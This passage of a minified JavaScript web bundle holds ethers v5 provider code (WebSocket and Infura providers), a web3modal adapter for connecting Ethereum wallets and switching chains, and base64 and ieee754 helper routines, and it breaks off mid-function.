r=this.prepareRequest(e,t);null==r&&hn.throwError(e+" not implemented",we.errors.NOT_IMPLEMENTED,{operation:e});try{return yield this.send(r[0],r[1])}catch(r){return q7(e,r,t)}}))}_startEvent(e){"pending"===e.tag&&this._startPending(),super._startEvent(e)}_startPending(){if(null!=this._pendingFilter)return;const e=this,t=this.send("eth_newPendingTransactionFilter",[]);this._pendingFilter=t,t.then((function(r){return function n(){e.send("eth_getFilterChanges",[r]).then((function(r){if(e._pendingFilter!=t)return null;let n=Promise.resolve();return r.forEach((function(t){e._emitted["t:"+t.toLowerCase()]="pending",n=n.then((function(){return e.getTransaction(t).then((function(t){return e.emit("pending",t),null}))}))})),n.then((function(){return z8(1e3)}))})).then((function(){if(e._pendingFilter==t)return setTimeout((function(){n()}),0),null;e.send("eth_uninstallFilter",[r])})).catch((e=>{}))}(),r})).catch((e=>{}))}_stopEvent(e){"pending"===e.tag&&0===this.listenerCount("pending")&&(this._pendingFilter=null),super._stopEvent(e)}static hexlifyTransaction(e,t){const r=Wi(qte);if(t)for(const e in t)t[e]&&(r[e]=!0);bY(e,r);const n={};return["chainId","gasLimit","gasPrice","type","maxFeePerGas","maxPriorityFeePerGas","nonce","value"].forEach((function(t){if(null==e[t])return;const r=u_(Ke.from(e[t]));"gasLimit"===t&&(t="gas"),n[t]=r})),["from","to","data"].forEach((function(t){null!=e[t]&&(n[t]=kt(e[t]))})),e.accessList&&(n.accessList=U0(e.accessList)),n}}let Dd=null;try{if(Dd=WebSocket,null==Dd)throw new Error("inject please")}catch{const e=new we(Zc);Dd=function(){e.throwError("WebSockets not supported in this environment",we.errors.UNSUPPORTED_OPERATION,{operation:"new WebSocket()"})}}var sy=globalThis&&globalThis.__awaiter||function(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))};const R1=new we(Zc);let Vte=1;class Gte extends Vv{constructor(e,t){"any"===t&&R1.throwError("WebSocketProvider does not support 'any' network yet",we.errors.UNSUPPORTED_OPERATION,{operation:"network:any"}),super("string"==typeof e?e:"_websocket",t),this._pollingInterval=-1,this._wsReady=!1,_t(this,"_websocket","string"==typeof e?new Dd(this.connection.url):e),_t(this,"_requests",{}),_t(this,"_subs",{}),_t(this,"_subIds",{}),_t(this,"_detectNetwork",super.detectNetwork()),this.websocket.onopen=()=>{this._wsReady=!0,Object.keys(this._requests).forEach((e=>{this.websocket.send(this._requests[e].payload)}))},this.websocket.onmessage=e=>{const t=e.data,r=JSON.parse(t);if(null!=r.id){const e=String(r.id),n=this._requests[e];if(delete this._requests[e],void 0!==r.result)n.callback(null,r.result),this.emit("debug",{action:"response",request:JSON.parse(n.payload),response:r.result,provider:this});else{let e=null;r.error?(e=new Error(r.error.message||"unknown error"),_t(e,"code",r.error.code||null),_t(e,"response",t)):e=new Error("unknown error"),n.callback(e,void 0),this.emit("debug",{action:"response",error:e,request:JSON.parse(n.payload),provider:this})}}else if("eth_subscription"===r.method){const e=this._subs[r.params.subscription];e&&e.processFunc(r.params.result)}else console.warn("this should not happen")};const r=setInterval((()=>{this.emit("poll")}),1e3);r.unref&&r.unref()}get websocket(){return this._websocket}detectNetwork(){return this._detectNetwork}get pollingInterval(){return 0}resetEventsBlock(e){R1.throwError("cannot reset events block on WebSocketProvider",we.errors.UNSUPPORTED_OPERATION,{operation:"resetEventBlock"})}set pollingInterval(e){R1.throwError("cannot set polling interval on WebSocketProvider",we.errors.UNSUPPORTED_OPERATION,{operation:"setPollingInterval"})}poll(){return sy(this,void 0,void 0,(function*(){return null}))}set polling(e){e&&R1.throwError("cannot set polling on WebSocketProvider",we.errors.UNSUPPORTED_OPERATION,{operation:"setPolling"})}send(e,t){const r=Vte++;return new Promise(((n,i)=>{const o=JSON.stringify({method:e,params:t,id:r,jsonrpc:"2.0"});this.emit("debug",{action:"request",request:JSON.parse(o),provider:this}),this._requests[String(r)]={callback:function(e,t){return e?i(e):n(t)},payload:o},this._wsReady&&this.websocket.send(o)}))}static defaultUrl(){return"ws://localhost:8546"}_subscribe(e,t,r){return sy(this,void 0,void 0,(function*(){let n=this._subIds[e];null==n&&(n=Promise.all(t).then((e=>this.send("eth_subscribe",e))),this._subIds[e]=n);const i=yield n;this._subs[i]={tag:e,processFunc:r}}))}_startEvent(e){switch(e.type){case"block":this._subscribe("block",["newHeads"],(e=>{const t=Ke.from(e.number).toNumber();this._emitted.block=t,this.emit("block",t)}));break;case"pending":this._subscribe("pending",["newPendingTransactions"],(e=>{this.emit("pending",e)}));break;case"filter":this._subscribe(e.tag,["logs",this._getFilter(e.filter)],(t=>{null==t.removed&&(t.removed=!1),this.emit(e.filter,this.formatter.filterLog(t))}));break;case"tx":{const t=e=>{const t=e.hash;this.getTransactionReceipt(t).then((e=>{e&&this.emit(t,e)}))};t(e),this._subscribe("tx",["newHeads"],(e=>{this._events.filter((e=>"tx"===e.type)).forEach(t)}));break}case"debug":case"poll":case"willPoll":case"didPoll":case"error":break;default:console.log("unhandled:",e)}}_stopEvent(e){let t=e.tag;if("tx"===e.type){if(this._events.filter((e=>"tx"===e.type)).length)return;t="tx"}else if(this.listenerCount(e.event))return;const r=this._subIds[t];r&&(delete this._subIds[t],r.then((e=>{this._subs[e]&&(delete this._subs[e],this.send("eth_unsubscribe",[e]))})))}destroy(){return sy(this,void 0,void 0,(function*(){this.websocket.readyState===Dd.CONNECTING&&(yield new Promise((e=>{this.websocket.onopen=function(){e(!0)},this.websocket.onerror=function(){e(!1)}}))),this.websocket.close(1e3)}))}}var Kte=globalThis&&globalThis.__awaiter||function(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))};const Sd=new we(Zc);class Jte extends Vv{detectNetwork(){const e=Object.create(null,{detectNetwork:{get:()=>super.detectNetwork}});return Kte(this,void 0,void 0,(function*(){let t=this.network;return null==t&&(t=yield e.detectNetwork.call(this),t||Sd.throwError("no network detected",we.errors.UNKNOWN_ERROR,{}),null==this._network&&(_t(this,"_network",t),this.emit("network",t,null))),t}))}}class __ extends Jte{constructor(e,t){Sd.checkAbstract(new.target,__),e=Ec(new.target,"getNetwork")(e),t=Ec(new.target,"getApiKey")(t);super(Ec(new.target,"getUrl")(e,t),e),"string"==typeof t?_t(this,"apiKey",t):null!=t&&Object.keys(t).forEach((e=>{_t(this,e,t[e])}))}_startPending(){Sd.warn("WARNING: API provider does not support pending filters")}isCommunityResource(){return!1}getSigner(e){return Sd.throwError("API provider does not support signing",we.errors.UNSUPPORTED_OPERATION,{operation:"getSigner"})}listAccounts(){return Promise.resolve([])}static getApiKey(e){return e}static getUrl(e,t){return Sd.throwError("not implemented; sub-classes must override getUrl",we.errors.NOT_IMPLEMENTED,{operation:"getUrl"})}}const sg=new we(Zc),Cd="84842078b09946638c03157f83405213";class Zte extends Gte{constructor(e,t){const r=new G7(e,t),n=r.connection;n.password&&sg.throwError("INFURA WebSocket project secrets unsupported",we.errors.UNSUPPORTED_OPERATION,{operation:"InfuraProvider.getWebSocketProvider()"});super(n.url.replace(/^http/i,"ws").replace("/v3/","/ws/v3/"),e),_t(this,"apiKey",r.projectId),_t(this,"projectId",r.projectId),_t(this,"projectSecret",r.projectSecret)}isCommunityResource(){return this.projectId===Cd}}class G7 extends __{static getWebSocketProvider(e,t){return new Zte(e,t)}static getApiKey(e){const t={apiKey:Cd,projectId:Cd,projectSecret:null};return null==e||("string"==typeof e?t.projectId=e:null!=e.projectSecret?(sg.assertArgument("string"==typeof e.projectId,"projectSecret requires a projectId","projectId",e.projectId),sg.assertArgument("string"==typeof e.projectSecret,"invalid projectSecret","projectSecret","[REDACTED]"),t.projectId=e.projectId,t.projectSecret=e.projectSecret):e.projectId&&(t.projectId=e.projectId),t.apiKey=t.projectId),t}static getUrl(e,t){let r=null;switch(e?e.name:"unknown"){case"homestead":r="mainnet.infura.io";break;case"goerli":r="goerli.infura.io";break;case"sepolia":r="sepolia.infura.io";break;case"matic":r="polygon-mainnet.infura.io";break;case"maticmum":r="polygon-mumbai.infura.io";break;case"optimism":r="optimism-mainnet.infura.io";break;case"optimism-goerli":r="optimism-goerli.infura.io";break;case"arbitrum":r="arbitrum-mainnet.infura.io";break;case"arbitrum-goerli":r="arbitrum-goerli.infura.io";break;default:sg.throwError("unsupported network",we.errors.INVALID_ARGUMENT,{argument:"network",value:e})}const n={allowGzip:!0,url:"https://"+r+"/v3/"+t.projectId,throttleCallback:(e,r)=>(t.projectId===Cd&&Mte(),Promise.resolve(!0))};return null!=t.projectSecret&&(n.user="",n.password=t.projectSecret),n}isCommunityResource(){return this.projectId===Cd}}const H8=new we(Zc);let Qte=1;function q8(e,t){const r="Web3LegacyFetcher";return function(e,n){const i={method:e,params:n,id:Qte++,jsonrpc:"2.0"};return new Promise(((e,n)=>{this.emit("debug",{action:"request",fetcher:r,request:Gl(i),provider:this}),t(i,((t,o)=>{if(t)return this.emit("debug",{action:"response",fetcher:r,error:t,request:i,provider:this}),n(t);if(this.emit("debug",{action:"response",fetcher:r,request:i,response:o,provider:this}),o.error){const e=new Error(o.error.message);return e.code=o.error.code,e.data=o.error.data,n(e)}e(o.result)}))}))}}function Yte(e){return function(t,r){null==r&&(r=[]);const n={method:t,params:r};return this.emit("debug",{action:"request",fetcher:"Eip1193Fetcher",request:Gl(n),provider:this}),e.request(n).then((e=>(this.emit("debug",{action:"response",fetcher:"Eip1193Fetcher",request:n,response:e,provider:this}),e)),(e=>{throw this.emit("debug",{action:"response",fetcher:"Eip1193Fetcher",request:n,error:e,provider:this}),e}))}}class Kg extends Vv{constructor(e,t){null==e&&H8.throwArgumentError("missing provider","provider",e);let r=null,n=null,i=null;"function"==typeof e?(r="unknown:",n=e):(r=e.host||e.path||"",!r&&e.isMetaMask&&(r="metamask"),i=e,e.request?(""===r&&(r="eip-1193:"),n=Yte(e)):e.sendAsync?n=q8(e,e.sendAsync.bind(e)):e.send?n=q8(e,e.send.bind(e)):H8.throwArgumentError("unsupported provider","provider",e),r||(r="unknown:")),super(r,t),_t(this,"jsonRpcFetchFunc",n),_t(this,"provider",i)}send(e,t){return this.jsonRpcFetchFunc(e,t)}}const Xte=["wei","kwei","mwei","gwei","szabo","finney","ether"];function ere(e,t){if("string"==typeof t){const e=Xte.indexOf(t);-1!==e&&(t=3*e)}return eg(e,t??18)}function tre(e){return ere(e,18)}const Li=qi({provider:void 0,providerType:void 0,address:void 0,chainId:void 0,isConnected:!1}),tt={state:Li,subscribeKey:(e,t)=>yo(Li,e,t),subscribe:e=>eu(Li,(()=>e(Li))),setProvider(e){e&&(Li.provider=qd(e))},setProviderType(e){Li.providerType=e},setAddress(e){Li.address=e},setChainId(e){Li.chainId=e},setIsConnected(e){Li.isConnected=e},reset(){Li.provider=void 0,Li.address=void 0,Li.chainId=void 0,Li.providerType=void 0,Li.isConnected=!1}};function rre(e){if(e)return{id:`${qe.EIP155}:${e.chainId}`,name:e.name,imageId:Ln.EIP155NetworkImageIds[e.chainId]}}function oy(e){const t=e.startsWith("0x")?e.slice(2):e;return parseInt(t,16)}function tf(e){return`0x${e.toString(16)}`}async function T1(e,t,r){"walletConnect"===r?await e.request({method:"wallet_addEthereumChain",params:[{chainId:tf(t.chainId),rpcUrls:t.rpcUrl,chainName:t.name,nativeCurrency:{name:t.currency,decimals:18,symbol:t.currency},blockExplorerUrls:t.explorerUrl,iconUrls:[Ln.EIP155NetworkImageIds[t.chainId]]}]}):await e.send("wallet_addEthereumChain",[{chainId:tf(t.chainId),rpcUrls:t.rpcUrl,chainName:t.name,nativeCurrency:{name:t.currency,decimals:18,symbol:t.currency},blockExplorerUrls:t.explorerUrl,iconUrls:[Ln.EIP155NetworkImageIds[t.chainId]]}])}const mn="@w3m/wallet_id",hc=4902,N1=5e3;class nre extends FW{constructor(e){const{ethersConfig:t,chains:r,defaultChain:n,tokens:i,chainImages:o,_sdkVersion:s,...a}=e;if(!t)throw new Error("web3modal:constructor - ethersConfig is undefined");if(!a.projectId)throw new Error("web3modal:constructor - projectId is undefined");const c={switchCaipNetwork:async e=>{const t=b1.caipNetworkIdToNumber(null==e?void 0:e.id);t&&await this.switchNetwork(t)},getApprovedCaipNetworksData:async()=>new Promise((async e=>{var t,r,n,i;const o=localStorage.getItem(mn);if(null!=o&&o.includes(qe.WALLET_CONNECT_CONNECTOR_ID)){const o=await this.getWalletConnectProvider();if(!o)throw new Error("networkControllerClient:getApprovedCaipNetworks - connector is undefined");const s=null==(r=null==(t=(null==o?void 0:o.provider).signer)?void 0:t.session)?void 0:r.namespaces,a=null==(n=null==s?void 0:s[qe.EIP155])?void 0:n.methods,c=null==(i=null==s?void 0:s[qe.EIP155])?void 0:i.chains;e({supportsAllNetworks:(null==a?void 0:a.includes(qe.ADD_CHAIN_METHOD))??!1,approvedCaipNetworkIds:c})}else e({approvedCaipNetworkIds:void 0,supportsAllNetworks:!0})}))},l={connectWalletConnect:async e=>{const t=await this.getWalletConnectProvider();if(!t)throw new Error("connectionControllerClient:getWalletConnectUri - connector is undefined");const r=t.provider;r.on("display_uri",(t=>{e(t)})),await r.connect(),await this.setWalletConnectProvider()},connectExternal:async({id:e,info:r,provider:n})=>{if(e===qe.INJECTED_CONNECTOR_ID){const e=t.injected;if(!e)throw new Error("connectionControllerClient:connectInjected - connector is undefined");await e.send("eth_requestAccounts",[]),this.setInjectedProvider(t)}else if(e===qe.EIP6963_CONNECTOR_ID&&r&&n){const e=n,t=r;await e.send("eth_requestAccounts",[]),this.setEIP6963Provider(e,t.name)}else if(e===qe.COINBASE_CONNECTOR_ID){const e=t.coinbase;if(!e)throw new Error("connectionControllerClient:connectCoinbase - connector is undefined");await e.send("eth_requestAccounts",[]),this.setCoinbaseProvider(t)}},checkInstalled:e=>e?!(t.injected&&(null==window||!window.ethereum))&&e.some((e=>{var t;return!(null==(t=window.ethereum)||!t[String(e)])})):!!window.ethereum,disconnect:async()=>{const e=tt.state.provider,t=tt.state.providerType;localStorage.removeItem(mn),tt.reset(),t===qe.WALLET_CONNECT_CONNECTOR_ID?await(null==e?void 0:e.provider).disconnect():e&&e.emit("disconnect")}};super({networkControllerClient:c,connectionControllerClient:l,defaultChain:rre(n),tokens:b1.getCaipTokens(i),_sdkVersion:s??`html-ethers5-${qe.VERSION}`,...a}),this.hasSyncedConnectedAccount=!1,this.EIP6963Providers=[],this.options=void 0,this.options=e,this.metadata=t.metadata,this.projectId=a.projectId,this.chains=r,this.createProvider(),tt.subscribeKey("address",(()=>{this.syncAccount()})),tt.subscribeKey("chainId",(()=>{this.syncNetwork(o)})),this.syncRequestedNetworks(r,o),this.syncConnectors(t),t.EIP6963&&typeof window<"u"&&(this.listenConnectors(t.EIP6963),this.checkActive6963Provider()),t.injected&&this.checkActiveInjectedProvider(t),t.coinbase&&this.checkActiveCoinbaseProvider(t)}getState(){const e=super.getState();return{...e,selectedNetworkId:b1.caipNetworkIdToNumber(e.selectedNetworkId)}}subscribeState(e){return super.subscribeState((t=>e({...t,selectedNetworkId:b1.caipNetworkIdToNumber(t.selectedNetworkId)})))}getAddress(){return tt.state.address}getChainId(){return tt.state.chainId}getIsConnected(){return tt.state.isConnected}getWalletProvider(){return tt.state.provider}getWalletProviderType(){return tt.state.providerType}getSigner(){var e;return null==(e=tt.state.provider)?void 0:e.getSigner()}subscribeProvider(e){return tt.subscribe(e)}createProvider(){return!this.walletConnectProviderInitPromise&&typeof window<"u"&&(this.walletConnectProviderInitPromise=this.initWalletConnectProvider()),this.walletConnectProviderInitPromise}async initWalletConnectProvider(){const e={projectId:this.projectId,showQrModal:!1,rpcMap:this.chains?this.chains.reduce(((e,t)=>(e[t.chainId]=t.rpcUrl,e)),{}):{},optionalChains:this.chains?[0,...this.chains.map((e=>e.chainId))]:[0],metadata:{name:this.metadata?this.metadata.name:"",description:this.metadata?this.metadata.description:"",url:this.metadata?this.metadata.url:"",icons:this.metadata?this.metadata.icons:[""]}};this.walletConnectProvider=await aY.init(e),this.ethersWalletConnectProvider=new Kg(this.walletConnectProvider),await this.checkActiveWalletConnectProvider()}async getWalletConnectProvider(){return this.ethersWalletConnectProvider||await this.createProvider(),this.ethersWalletConnectProvider}syncRequestedNetworks(e,t){const r=null==e?void 0:e.map((e=>({id:`${qe.EIP155}:${e.chainId}`,name:e.name,imageId:Ln.EIP155NetworkImageIds[e.chainId],imageUrl:null==t?void 0:t[e.chainId]})));this.setRequestedCaipNetworks(r??[])}async checkActiveWalletConnectProvider(){const e=await this.getWalletConnectProvider(),t=null==e?void 0:e.provider,r=localStorage.getItem(mn);t&&r===qe.WALLET_CONNECT_CONNECTOR_ID&&await this.setWalletConnectProvider()}checkActiveInjectedProvider(e){var t;const r=null==(t=e.injected)?void 0:t.provider,n=localStorage.getItem(mn);r&&n===qe.INJECTED_CONNECTOR_ID&&(this.setInjectedProvider(e),this.watchInjected(e))}checkActiveCoinbaseProvider(e){var t,r;const n=null==(t=e.coinbase)?void 0:t.provider,i=localStorage.getItem(mn);n&&i===qe.COINBASE_CONNECTOR_ID&&(n._addresses&&(null==(r=n._addresses)?void 0:r.length)>0?(this.setCoinbaseProvider(e),this.watchCoinbase(e)):(localStorage.removeItem(mn),tt.reset()))}checkActive6963Provider(){const e=null==window?void 0:window.localStorage.getItem(mn);if(e){const t=this.EIP6963Providers.find((t=>t.name===e));t&&this.setEIP6963Provider(t.provider,t.name)}}async setWalletConnectProvider(){null==window||window.localStorage.setItem(mn,qe.WALLET_CONNECT_CONNECTOR_ID);const e=await this.getWalletConnectProvider(),t=null==e?void 0:e.provider;t&&(tt.setChainId(t.chainId),tt.setProviderType("walletConnect"),tt.setProvider(e),tt.setIsConnected(!0),tt.setAddress(t.accounts[0]),this.watchWalletConnect())}async setInjectedProvider(e){null==window||window.localStorage.setItem(mn,qe.INJECTED_CONNECTOR_ID);const t=e.injected;if(t){const r=t.getSigner(),n=await r.getChainId(),i=await r.getAddress();i&&n&&(tt.setChainId(n),tt.setProviderType("injected"),tt.setProvider(e.injected),tt.setIsConnected(!0),tt.setAddress(i),this.watchCoinbase(e))}}async setEIP6963Provider(e,t){if(null==window||window.localStorage.setItem(mn,t),e){const t=e.getSigner(),r=await t.getChainId(),n=await t.getAddress();n&&r&&(tt.setChainId(r),tt.setProviderType("eip6963"),tt.setProvider(e),tt.setIsConnected(!0),tt.setAddress(n),this.watchEIP6963(e))}}async setCoinbaseProvider(e){null==window||window.localStorage.setItem(mn,qe.COINBASE_CONNECTOR_ID);const t=e.coinbase;if(t){const r=t.getSigner(),n=await r.getChainId(),i=await r.getAddress();i&&n&&(tt.setChainId(n),tt.setProviderType("coinbaseWallet"),tt.setProvider(e.coinbase),tt.setIsConnected(!0),tt.setAddress(i),this.watchCoinbase(e))}}async watchWalletConnect(){const e=await this.getWalletConnectProvider(),t=null==e?void 0:e.provider;function r(e){if(e){const t=oy(e);tt.setChainId(t)}}const n=async e=>{e.length>0&&await this.setWalletConnectProvider()};t&&(t.on("disconnect",(function e(){localStorage.removeItem(mn),tt.reset(),t.removeListener("disconnect",e),t.removeListener("accountsChanged",n),t.removeListener("chainChanged",r)})),t.on("accountsChanged",n),t.on("chainChanged",r))}watchInjected(e){const t=e.injected,r=null==t?void 0:t.provider;function n(){localStorage.removeItem(mn),tt.reset(),r.removeListener("disconnect",n),r.removeListener("accountsChanged",i),r.removeListener("chainChanged",o)}function i(e){0===e.length?(localStorage.removeItem(mn),tt.reset()):tt.setAddress(e[0])}function o(e){if(e){const t="string"==typeof e?oy(e):Number(e);tt.setChainId(t)}}r&&t&&(t.on("disconnect",n),r.on("disconnect",n),r.on("accountsChanged",i),r.on("chainChanged",o))}watchEIP6963(e){const t=e.provider;function r(){localStorage.removeItem(mn),tt.reset(),t.removeListener("disconnect",r),t.removeListener("accountsChanged",n),t.removeListener("chainChanged",i)}function n(e){0===e.length?(localStorage.removeItem(mn),tt.reset()):tt.setAddress(e[0])}function i(e){if(e){const t="string"==typeof e?oy(e):Number(e);tt.setChainId(t)}}t&&(e.on("disconnect",r),t.on("disconnect",r),t.on("accountsChanged",n),t.on("chainChanged",i))}watchCoinbase(e){const t=e.coinbase,r=null==t?void 0:t.provider,n=localStorage.getItem(mn);function i(){localStorage.removeItem(mn),tt.reset(),r.removeListener("disconnect",i),r.removeListener("accountsChanged",o),r.removeListener("chainChanged",s)}function o(e){0===e.length?(localStorage.removeItem(mn),tt.reset()):tt.setAddress(e[0])}function s(e){if(e&&n===qe.COINBASE_CONNECTOR_ID){const t=Number(e);tt.setChainId(t)}}r&&t&&(t.on("disconnect",i),r.on("disconnect",i),r.on("accountsChanged",o),r.on("chainChanged",s))}async syncAccount(){const e=tt.state.address,t=tt.state.chainId,r=tt.state.isConnected;if(this.resetAccount(),r&&e&&t){const n=`${qe.EIP155}:${t}:${e}`;this.setIsConnected(r),this.setCaipAddress(n),await Promise.all([this.syncProfile(e),this.syncBalance(e),this.getApprovedCaipNetworksData()]),this.hasSyncedConnectedAccount=!0}else!r&&this.hasSyncedConnectedAccount&&(this.resetWcConnection(),this.resetNetwork())}async syncNetwork(e){const t=tt.state.address,r=tt.state.chainId,n=tt.state.isConnected;if(this.chains){const i=this.chains.find((e=>e.chainId===r));if(i){const o=`${qe.EIP155}:${i.chainId}`;if(this.setCaipNetwork({id:o,name:i.name,imageId:Ln.EIP155NetworkImageIds[i.chainId],imageUrl:null==e?void 0:e[i.chainId]}),n&&t){const e=`${qe.EIP155}:${r}:${t}`;if(this.setCaipAddress(e),i.explorerUrl){const e=`${i.explorerUrl}/address/${t}`;this.setAddressExplorerUrl(e)}else this.setAddressExplorerUrl(void 0);this.hasSyncedConnectedAccount&&await this.syncBalance(t)}}}}async syncProfile(e){const t=new G7("mainnet"),r=await t.lookupAddress(e),n=await t.getAvatar(e);r&&this.setProfileName(r),n&&this.setProfileImage(n)}async syncBalance(e){const t=tt.state.chainId;if(t&&this.chains){const r=this.chains.find((e=>e.chainId===t));if(r){const n=new Vv(r.rpcUrl,{chainId:t,name:r.name});if(n){const t=tre(await n.getBalance(e));this.setBalance(t,r.currency)}}}}async switchNetwork(e){var t,r,n,i,o,s,a,c;const l=tt.state.provider,u=tt.state.providerType;if(this.chains){const h=this.chains.find((t=>t.chainId===e));if(u===qe.WALLET_CONNECT_CONNECTOR_ID&&h){const n=null==l?void 0:l.provider;if(n)try{await n.request({method:"wallet_switchEthereumChain",params:[{chainId:tf(h.chainId)}]}),tt.setChainId(e)}catch(e){if(e.code!==hc&&e.code!==N1&&(null==(r=null==(t=null==e?void 0:e.data)?void 0:t.originalError)?void 0:r.code)!==hc)throw new Error("Chain is not supported");await T1(n,h,qe.WALLET_CONNECT_CONNECTOR_ID)}}else if(u===qe.INJECTED_CONNECTOR_ID&&h){const e=l;if(e)try{await e.send("wallet_switchEthereumChain",[{chainId:tf(h.chainId)}]),tt.setChainId(h.chainId)}catch(t){if(t.code!==hc&&t.code!==N1&&(null==(i=null==(n=null==t?void 0:t.data)?void 0:n.originalError)?void 0:i.code)!==hc)throw new Error("Chain is not supported");await T1(e,h,qe.INJECTED_CONNECTOR_ID)}}else if(u===qe.EIP6963_CONNECTOR_ID&&h){const e=l;if(e)try{await e.send("wallet_switchEthereumChain",[{chainId:tf(h.chainId)}]),tt.setChainId(h.chainId)}catch(t){if(t.code!==hc&&t.code!==N1&&(null==(s=null==(o=null==t?void 0:t.data)?void 0:o.originalError)?void 0:s.code)!==hc)throw new Error("Chain is not supported");await T1(e,h,qe.INJECTED_CONNECTOR_ID)}}else if(u===qe.COINBASE_CONNECTOR_ID&&h){const e=l;if(e)try{await e.send("wallet_switchEthereumChain",[{chainId:tf(h.chainId)}]),tt.setChainId(h.chainId)}catch(t){(t.code===hc||t.code===N1||(null==(c=null==(a=null==t?void 0:t.data)?void 0:a.originalError)?void 0:c.code)===hc)&&await T1(e,h,qe.INJECTED_CONNECTOR_ID)}}}}syncConnectors(e){var t,r,n,i,o,s;const a=[],c=Ln.ConnectorTypesMap[qe.WALLET_CONNECT_CONNECTOR_ID];if(a.push({id:qe.WALLET_CONNECT_CONNECTOR_ID,explorerId:Ln.ConnectorExplorerIds[qe.WALLET_CONNECT_CONNECTOR_ID],imageId:Ln.ConnectorImageIds[qe.WALLET_CONNECT_CONNECTOR_ID],imageUrl:null==(r=null==(t=this.options)?void 0:t.connectorImages)?void 0:r[qe.WALLET_CONNECT_CONNECTOR_ID],name:Ln.ConnectorNamesMap[qe.WALLET_CONNECT_CONNECTOR_ID],type:c}),e.injected){const e=Ln.ConnectorTypesMap[qe.INJECTED_CONNECTOR_ID];a.push({id:qe.INJECTED_CONNECTOR_ID,explorerId:Ln.ConnectorExplorerIds[qe.INJECTED_CONNECTOR_ID],imageId:Ln.ConnectorImageIds[qe.INJECTED_CONNECTOR_ID],imageUrl:null==(i=null==(n=this.options)?void 0:n.connectorImages)?void 0:i[qe.INJECTED_CONNECTOR_ID],name:Ln.ConnectorNamesMap[qe.INJECTED_CONNECTOR_ID],type:e})}e.coinbase&&a.push({id:qe.COINBASE_CONNECTOR_ID,explorerId:Ln.ConnectorExplorerIds[qe.COINBASE_CONNECTOR_ID],imageId:Ln.ConnectorImageIds[qe.COINBASE_CONNECTOR_ID],imageUrl:null==(s=null==(o=this.options)?void 0:o.connectorImages)?void 0:s[qe.COINBASE_CONNECTOR_ID],name:Ln.ConnectorNamesMap[qe.COINBASE_CONNECTOR_ID],type:"EXTERNAL"}),this.setConnectors(a)}eip6963EventHandler(e){var t,r;if(e.detail){const{info:n,provider:i}=e.detail;if(!this.getConnectors().find((e=>e.name===n.name))){const e=new Kg(i),o=Ln.ConnectorTypesMap[qe.EIP6963_CONNECTOR_ID];{this.addConnector({id:qe.EIP6963_CONNECTOR_ID,type:o,imageUrl:n.icon??(null==(r=null==(t=this.options)?void 0:t.connectorImages)?void 0:r[qe.EIP6963_CONNECTOR_ID]),name:n.name,provider:e,info:n});const i={name:n.name,provider:e};this.EIP6963Providers.push(i)}}}}listenConnectors(e){if(typeof window<"u"&&e){const e=this.eip6963EventHandler.bind(this);window.addEventListener(qe.EIP6963_ANNOUNCE_EVENT,e),window.dispatchEvent(new Event(qe.EIP6963_REQUEST_EVENT))}}}var gh={},Gv={};Gv.byteLength=ore,Gv.toByteArray=cre,Gv.fromByteArray=fre;for(var Wo=[],Ns=[],ire=typeof Uint8Array<"u"?Uint8Array:Array,ay="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",Wu=0,sre=ay.length;Wu<sre;++Wu)Wo[Wu]=ay[Wu],Ns[ay.charCodeAt(Wu)]=Wu;function K7(e){var t=e.length;if(t%4>0)throw new Error("Invalid string. Length must be a multiple of 4");var r=e.indexOf("=");return-1===r&&(r=t),[r,r===t?0:4-r%4]}function ore(e){var t=K7(e),r=t[0],n=t[1];return 3*(r+n)/4-n}function are(e,t,r){return 3*(t+r)/4-r}function cre(e){var t,r,n=K7(e),i=n[0],o=n[1],s=new ire(are(e,i,o)),a=0,c=o>0?i-4:i;for(r=0;r<c;r+=4)t=Ns[e.charCodeAt(r)]<<18|Ns[e.charCodeAt(r+1)]<<12|Ns[e.charCodeAt(r+2)]<<6|Ns[e.charCodeAt(r+3)],s[a++]=t>>16&255,s[a++]=t>>8&255,s[a++]=255&t;return 2===o&&(t=Ns[e.charCodeAt(r)]<<2|Ns[e.charCodeAt(r+1)]>>4,s[a++]=255&t),1===o&&(t=Ns[e.charCodeAt(r)]<<10|Ns[e.charCodeAt(r+1)]<<4|Ns[e.charCodeAt(r+2)]>>2,s[a++]=t>>8&255,s[a++]=255&t),s}function lre(e){return Wo[e>>18&63]+Wo[e>>12&63]+Wo[e>>6&63]+Wo[63&e]}function ure(e,t,r){for(var n,i=[],o=t;o<r;o+=3)n=(e[o]<<16&16711680)+(e[o+1]<<8&65280)+(255&e[o+2]),i.push(lre(n));return i.join("")}function fre(e){for(var t,r=e.length,n=r%3,i=[],o=16383,s=0,a=r-n;s<a;s+=o)i.push(ure(e,s,s+o>a?a:s+o));return 1===n?(t=e[r-1],i.push(Wo[t>>2]+Wo[t<<4&63]+"==")):2===n&&(t=(e[r-2]<<8)+e[r-1],i.push(Wo[t>>10]+Wo[t>>4&63]+Wo[t<<2&63]+"=")),i.join("")}Ns["-".charCodeAt(0)]=62,Ns["_".charCodeAt(0)]=63;var yA,E_={};/*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */E_.read=function(e,t,r,n,i){var o,s,a=8*i-n-1,c=(1<<a)-1,l=c>>1,u=-7,h=r?i-1:0,d=r?-1:1,f=e[t+h];for(h+=d,o=f&(1<<-u)-1,f>>=-u,u+=a;u>0;o=256*o+e[t+h],h+=d,u-=8);for(s=o&(1<<-u)-1,o>>=-u,u+=n;u>0;s=256*s+e[t+h],h+=d,u-=8);if(0===o)o=1-l;else{if(o===c)return s?NaN:1/0*(f?-1:1);s+=Math.pow(2,n),o-=l}return(f?-1:1)*s*Math.pow(2,o-n)},E_.write=function(e,t,r,n,i,o){var 